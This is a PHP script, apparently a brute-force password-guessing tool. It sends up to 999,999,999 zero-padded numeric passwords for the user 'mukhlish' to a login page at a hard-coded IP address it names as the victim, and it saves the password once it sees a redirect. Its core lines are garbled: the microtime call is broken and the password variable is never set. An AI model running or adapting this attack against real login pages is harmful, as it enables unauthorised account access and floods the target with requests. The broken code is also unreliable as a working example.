<?php

set_time_limit(0);
date_default_timezone_set("Asia/Jakarta");
	$victim = "http://178.128.69.182/cre.php";
	$much = "999999999";
	for ($i=0; $i < $much; $i++) { 
		$password ;
    $awal = microtime(d = str_pad($i, '9', '0', STR_PAD_LEFT);
        
		curl($victim,$password,$awal);
	}


	function curl($victim,$password,$awal)
	{
		$post = "username=mukhlish&password=".$password."&submit=login";
        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL             => $victim,
            CURLOPT_RETURNTRANSFER  => 1,
            CURLOPT_POST            => true,
            CURLOPT_POSTFIELDS      => $post,
            CURLOPT_HEADER          =>1,
            CURLOPT_NOBODY          =>0,
            CURLOPT_FOLLOWLOCATION  =>1,
            CURLOPT_AUTOREFERER     =>1,
            CURLOPT_USERAGENT       => "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
            CURLOPT_COOKIESESSION   => true,
            ));
      
     	$respon = curl_exec($curl);

     	//print $respon;

     	$akhir = microtime(true);
		$lama = substr(($akhir - $_SERVER["REQUEST_TIME_FLOAT"]),0,4);


     	if(preg_match("#HTTP/1.1 302#", $respon))
     	{

			print "{$password} berhasil bos - {$lama}s";
    		$myfile = fopen("password.txt", "a+") or die("Unable to open file!");
    		fwrite($myfile, $password);
    		fclose($myfile);
			Die("Found");
		}else
		{
			print "gagal $password - {$lama}s\r\n";
			
		}
  	}

?>